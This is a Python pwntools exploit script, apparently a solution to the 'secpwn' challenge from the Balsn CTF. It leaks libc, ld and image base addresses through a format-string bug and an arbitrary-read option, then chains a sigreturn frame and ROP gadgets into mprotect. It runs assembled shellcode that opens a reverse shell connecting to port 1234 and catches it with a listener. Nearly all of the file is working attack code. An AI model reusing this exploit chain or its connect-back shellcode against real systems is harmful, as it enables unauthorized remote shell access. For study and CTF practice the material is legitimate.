#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './secpwn'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('secpwn.balsnctf.com', 4597 )
elf = ELF(execve_file)
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *$rebase(0x1892)
    b *$rebase(0x160B)
    b exit
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

sh.sendlineafter('>\n', '5')
sh.sendafter('fmt:\n', '%a#%a#\n')
sh.recvuntil('#0x0.0')
result = sh.recvuntil('p', drop=True)
libc_addr = int(result, 16) - 0x1e57e3
log.success('libc_addr: ' + hex(libc_addr))
ld_addr = libc_addr + 0x1f4000
log.success('ld_addr: ' + hex(ld_addr))

open('/tmp/gdb_script{}'.replace('{}', salt), 'a').write('\nb *' + hex(ld_addr + 0x10cf0) + '\n')

sh.sendlineafter('>\n', '7')
sh.sendafter('Addr: ', str(libc_addr + libc.symbols['_rtld_global']))
ld_addr = u64(sh.recvn(8)) - 0x2b060
log.success('ld_addr: ' + hex(ld_addr))


sh.sendlineafter('>\n', '7')
sh.sendafter('Addr: ', str(ld_addr + 0x2b9f8))

image_base_addr = u64(sh.recvn(8)) - 0x2a8
log.success('image_base_addr: ' + hex(image_base_addr))

sh.sendlineafter('>\n', '1')
offset = libc_addr + libc.symbols['setcontext'] - image_base_addr
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = image_base_addr + 0x4000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = image_base_addr + 0x4000 + 0x320
frame.rip = libc_addr + 0x000000000002535f # : ret

str_frame = str(frame)
str_frame = str_frame[:0xe0] + p64(image_base_addr + 0x4800) + str_frame[0xe8:]
payload = p64(image_base_addr + 0x4020) + p64(offset) + str_frame[0x20:]

layout = [
    libc_addr + 0x00000000000314f9, # : pop rbx ; ret
    9,
    libc_addr + 0x0000000000087332, # : inc ebx ; xor eax, eax ; ret
    libc_addr + 0x0000000000048018, # : mov eax, ebx ; pop rbx ; ret
    0,
    libc_addr + 0x00000000000cf6c5, # : syscall ; ret
    libc_addr + 0x00000000000616a7, # : jmp rsp
]

shellcode = asm('''
;// socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
mov rdi, 2
mov rsi, 1
mov rdx, 0
mov rax, 41 ;// SYS_socket
syscall

;// connect(soc, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in))
mov rdi, rax
mov rax, 0x0100007fd2040002
push rax
mov rsi, rsp
mov rdx, 16
mov rax, 42 ;// SYS_connect
syscall
push rax

;// dup2(soc, 0)
mov rdi, rax
mov rsi, 0
mov rax, 33 ;// SYS_dup2
syscall

;// dup2(soc, 1)
pop rdi
mov rsi, 1
mov rax, 33 ;// SYS_dup2
syscall

;// execve("/bin/sh", NULL, NULL)
mov rax,0x0068732f6e69622f
push rax
mov rdi,rsp
mov rax,59
mov rsi,0
mov rdx,0
syscall
''')

payload = payload.ljust(0x300, '\0') + flat(layout) + shellcode
sh.sendline(payload)

sh.sendlineafter('>\n', '6')
sh.sendafter('Addr: ', str(ld_addr + 0x2c190 + 0xa8))
sh.sendafter(': ', p64(image_base_addr + 0x4020)[:6])

server = listen(1234)
sh.sendline('10')
reverse_sh = server.wait_for_connection()

reverse_sh.interactive()
clear()